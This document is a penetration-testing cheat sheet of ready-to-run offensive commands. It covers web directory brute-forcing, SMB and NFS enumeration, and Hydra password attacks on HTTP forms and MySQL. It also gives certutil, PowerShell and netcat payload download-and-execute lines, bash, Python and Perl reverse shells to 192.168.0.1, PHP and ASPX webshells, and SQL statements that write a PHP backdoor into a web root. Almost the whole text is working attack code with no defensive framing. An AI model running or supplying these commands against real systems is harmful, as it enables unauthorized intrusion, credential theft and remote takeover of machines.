common commands
==============================================================

# Gobuster

## Fast Scan (Small List)
```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirb/big.txt -t 20
```

## Fast Scan (Big List)
```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

## Slow Scan (Check File Extensions)

```bash
gobuster dir -e -u http://192.168.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20
```

## fix HTTPS cert errors
Set the --insecuressl flag.

# SMB fix `NT_STATUS_CONNECTION_DISCONNECTED` errors
To fix NT_STATUS_CONNECTION_DISCONNECTED errors in new Kali installations add client min protocol = NT1 to your \etc\samba\smb.conf file.

# smbclient

## List Shares (As Guest)
```bash
smbclient -U guest -L 192.168.0.1
```

## Connect to A Share (As User John)
```bash
smbclient \\\\192.168.0.1\\Users -U c.smith
```

## Download All Files From A Directory Recursively
```bash
smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'
```

example:
```bash
smbclient \\\\192.168.0.1\\Data -U John -c 'prompt OFF;recurse ON;cd '\Users\John\';lcd '/tmp/John';mget *'
```

## Alternate File Streams
List Streams

```bash
smbclient \\\\192.168.0.1\\Data -U John -c 'allinfo "\Users\John\file.txt"'
```

## Download Stream By Name (:SECRET)
```bash
smbclient \\\\192.168.0.1\\Data -U John

get "\Users\John\file.txt:SECRET:$DATA"
```

# Enum4Linux

## Scan Host
```bash
enum4linux 192.168.0.1
```

### Suppress Errors
```bash
enum4linux 192.168.0.1 | grep -Ev '^(Use of)' > enum4linux.out 
```

# NFS
## Show mountable drives
```bash
showmount -e 192.168.0.1
```

## Mount Drive
mkdir mpt
```bash
mount -t nfs -o soft 192.168.0.1:/backup mpt/
```

# WebApp Paths defaultsdb
https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md

# Hydra Brute Force
## HTTP Basic Authentication
```bash
hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15
```

## HTTP Get Request
```bash
hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15
```

## HTTP Post Request
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use https-post-form instead of http-post-form for HTTPS sites.
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
```

## MYSQL
Change MYDATABASENAME. Default databasename is mysql.
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15
```

# Powershell File Transfer As Cmd.exe Command
```bash
powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')
```

# Certutil Download
```bash
certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe
```

# Certutil Download & Execute Python Command
```bash
os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe')
```

# SMB List Drives (Execute on Victim)
```
net view \\192.168.0.1
```

# SMB Copy Files (Execute on Victim)
```
copy \\192.168.0.1\server_name\shell.exe shell.exe
```

# Netcat Receiving file
```bash
nc -l -p 1234 > out.file
```

# Netcat Sending file
```bash
nc -w 3 192.168.0.1 1234 < out.file
```

# Start TFTP Daemon (Folder /var/tftp)
```bash
atftpd --daemon --port 69 /var/tftp
```

# TFTP Transfer Files
```bash
tftp -i 192.168.0.1 GET whoami.exe
```

# python upgrade shell (TTY Shell)
```
python -c 'import pty;pty.spawn("/bin/bash");' 
```

# Bash Reverse Shell
```
/bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1
```

# Python Reverse Shell As Command 
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# Python Reverse Shell Code 
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

# Kali Default PHP Reverse Shell
```bash
cat /usr/share/webshells/php/php-reverse-shell.php
```

# Kali Default PHP CMD Shell
```bash
cat /usr/share/webshells/php/php-backdoor.php
```

# coyote PHP command shell
```php
<?php system($_REQUEST[0]); ?>
```


# WhiteWinterWolf Webshell
https://github.com/WhiteWinterWolf/wwwolf-php-webshell

# Active Sever Pages Extended (.aspx) Transfer A File (Certutil)
```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

# Active Sever Pages Extended (.aspx) Execute a File
```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

# Perl Reverse Shell
```
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

# PhpmyAdmin write shell
## Windows
Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

# linux
Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
```

# Sub domain Enum
```bash
findomain -t "$URL" -q
```

```bash
subfinder -d "$URL"
```

# URL CRAWL/ Discovery waybackurls
```bash
echo "$URL" | waybackurls| httpx-pd -silent > link.txt
```

